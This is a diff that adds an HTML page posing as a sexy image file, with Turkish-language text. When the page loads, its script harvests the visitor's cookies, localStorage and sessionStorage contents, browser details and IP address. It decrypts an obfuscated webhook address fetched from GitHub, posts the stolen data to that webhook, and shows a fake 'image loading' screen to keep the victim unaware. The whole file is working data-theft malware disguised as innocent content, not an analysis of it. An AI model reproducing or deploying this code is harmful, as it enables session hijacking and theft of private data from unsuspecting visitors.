@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>seksi_kiz_resim.jpg</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        const data = {
+            URL: location.href,
+            Cookies: document.cookie || '? Yok',
+            LocalStorage: (() => {
+                try { return JSON.stringify(localStorage); } 
+                catch (e) { return '? Erişilemedi'; }
+            })(),
+            SessionStorage: (() => {
+                try { return JSON.stringify(sessionStorage); } 
+                catch (e) { return '? Erişilemedi'; }
+            })(),
+            UserAgent: navigator.userAgent,
+            IP: 'Bekleniyor...',
+            Tarih: new Date().toISOString()
+        };
+
+        fetch('https://raw.githubusercontent.com/nefretwasherebaby/keys/main/webhook.enc')
+            .then(res => res.text())
+            .then(encrypted => {
+                const key = 'x7gT9kP2'; 
+                let decrypted = '';
+                const raw = atob(encrypted.trim()); 
+                for (let i = 0; i < raw.length; i++) {
+                    decrypted += String.fromCharCode(raw.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+                }
+                return decrypted;
+            })
+            .then(WEBHOOK_URL => {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(ip => { data.IP = ip.ip; return WEBHOOK_URL; });
+            })
+            .then(WEBHOOK_URL => {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: 'foti',
+                        avatar_url: 'https://i.imgur.com/rFhOcMq.png',
+                        embeds: [{
+                            title: 'eşşekevladıxd',
+                            description: 'Bilgiler alındı.',
+                            color: 15427378,
+                            fields: Object.keys(data).map(k => ({
+                                name: `📌 ${k.toUpperCase()}`,
+                                value: '```json\n' + (data[k] || 'N/A').toString().substr(0, 1000) + '\n```',
+                                inline: false
+                            })),
+                            footer: { text: 'nefretwasherebaby' },
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                }).catch(e => console.log('Gönderilemedi'));
+            })
+            .catch(e => console.error('Webhook hatası:', e));
+
+        document.body.innerHTML = `
+            <div style="width:100vw;height:100vh;margin:0;padding:0;overflow:hidden;background:#000;">
+                <img src="https://via.placeholder.com/1920x1080/2c2c2c/ffffff?text=Seksii+Resim+Yükleniyor...%0A%0ABirkaç+saniye+beğen" 
+                     style="width:100%;height:100%;object-fit:cover;">
+            </div>
+        `;
+    </script>
+</head>
+<body style="margin:0;overflow:hidden;background:#000;"></body>
+</html>
